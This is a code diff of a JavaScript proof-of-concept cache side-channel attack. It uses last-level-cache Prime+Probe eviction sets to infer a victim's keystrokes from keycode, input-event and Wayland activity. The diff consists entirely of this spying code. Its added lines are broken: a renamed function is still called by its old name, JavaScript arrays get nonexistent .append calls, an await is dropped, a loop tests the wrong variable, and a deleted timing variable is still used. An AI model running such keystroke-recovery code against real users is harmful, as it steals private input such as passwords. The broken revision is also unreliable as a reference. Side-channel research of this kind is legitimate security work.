@@ -618,27 +618,27 @@ async function find_evsets_all_slices(victim, module, memory, buffer, num_call){
     return found_sets;
 }
 
-async function find_target_evsets(sets, slices, module, memory, buffer){
+async function find_targeted_evsets(sets, slices, module, memory, buffer){
     let evsets = []
     if(sets.length > slices.length){
         for(let i = 0; i < sets.length-slices.length; i++){
-            slices.push(0); // append 0 if slices were not specified     
+            slices.append(0); // append 0 if slices were not specified     
         } 
     } 
     for(let i = 0; i < sets.length; i++){
         let victim = sets[i] * LINE_SIZE; 
-        let ret_sets = await find_evsets_all_slices(victim, module, memory, buffer, i); 
-        evsets.push(ret_sets[slices[i]]);
+        let ret_sets = find_evsets_all_slices(victim, module, memory, buffer, i); 
+        evsets.append(ret_sets[slices[i]]);
     }
     return evsets;
 } 
 
 function prime_probe_sec(evsets){
     
-    const BUFFER_BYTES = Math.floor(128*1024 / evsets.length);
+    const BUFFER_BYTES = 8*1024*1024;
     let traces = [];
     for(let i = 0; i < evsets.length; i++){
-        traces.push(new Uint8Array(BUFFER_BYTES));
+        traces.append(new Uint8Array(BUFFER_BYTES));
         traces[i].fill(0);
     }
 
@@ -648,31 +648,16 @@ function prime_probe_sec(evsets){
             evsets[j].probe();
         }
     }
-    let start_time = performance.now();
-    let byte_index = 0; 
-    while(performance.now() - start_time < 1000){
+    
+    for(let byte_index = 0; i < BUFFER_BYTES; byte_index++){
         for(let i = 0; i < 8; i++){
             for(let j = 0; j < evsets.length; j++){
                 traces[j][byte_index] += (evsets[j].probe() << i);
             }
         }
-        byte_index++;
     }
     
-    let ret = []
-    for(let i = 0; i < traces.length; i++){
-        ret.push(traces[i].slice(0, byte_index));
-    }
-    return ret;
-}
-
-function getBitSum(num){
-    let sum = 0;
-    while(num > 0){
-        sum += num & 1;
-        num >>= 1;
-    }
-    return sum;
+    return traces;
 }
 
 // This function provides a proof of concept LLC Prime+Probe attack to recover keystrokes
@@ -706,43 +691,44 @@ async function l3pp_keystrokes_poc(){
     let slices = [KEYCODE_SLICE, EVENT_SLICE, WAYLAND_SLICE];
 
     evsets = await find_target_evsets(sets, slices, module, memory, buffer);
-    log(evsets)
 
     /* typing test begins */
+    const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
+    const NUM_MEASUREMENTS_MS = 1024;
 
-    let keycode_hit_count_per_ms = new Uint16Array(8000); 
-    let event_hit_count_per_ms = new Uint16Array(8000); 
-    let wayland_hit_count_per_ms = new Uint16Array(8000); 
-
-    await sleep(5000);
-    
-    let start_measurement = Math.floor(performance.now())
-    log("start: " + start_measurement)
-
-    let keycode_traces = [], event_traces = [], wayland_traces = [];
-    for(let i = 0; i < 8; i++){
-        let traces = prime_probe_sec(evsets);
-        keycode_traces.push(traces[0]);
-        event_traces.push(traces[1]);
-        wayland_traces.push(traces[2]);
-    }
+    let keycode_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let event_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let wayland_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+   
+    let traces = prime_probe_sec(evsets);
+    let keycode_traces = traces[0];
+    let event_traces = traces[1];
+    let wayland_traces = traces[2];
 
     let end_measurement = Math.floor(performance.now());
     log("end: " + end_measurement)
     let duration = end_measurement - start_measurement;
     log("duration: " + duration)
 
-    for(let i = 0; i < keycode_traces.length; i++){
-        let ms_step = Math.floor(keycode_traces[i].length / 1000);
-        for(let j = 0; j < 1000; j++){
-           for(let k = 0; k < ms_step; k++){
-                keycode_hit_count_per_ms[i * 1000 + j] += getBitSum(keycode_traces[i][j * ms_step + k])
-                event_hit_count_per_ms[i * 1000 + j] += getBitSum(keycode_traces[i][j * ms_step + k])
-                wayland_hit_count_per_ms[i * 1000 + j] += getBitSum(keycode_traces[i][j * ms_step + k])
-            } 
+    for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
+        for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
+            let keycode_data = keycode_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            let event_data = event_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            let wayland_data = wayland_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            for(let l = 0; l < 8; l++){
+                let keycode_result = keycode_data & 1;
+                let event_result = event_data & 1;
+                let wayland_result = wayland_data & 1;
+                keycode_hit_count_per_ms[i] += keycode_result;
+                event_hit_count_per_ms[i] += event_result;
+                wayland_hit_count_per_ms[i] += wayland_result;
+                keycode_data >>= 1;
+                event_data >>= 1;
+                wayland_data >>= 1;
+            }
         }
     }
-    
+
     await graphKeystrokes({"keycode_data": keycode_hit_count_per_ms, "event_data": event_hit_count_per_ms, "wayland_data": wayland_hit_count_per_ms, "pp_duration": keycode_hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
 
     // remote_set_profiling(evset);
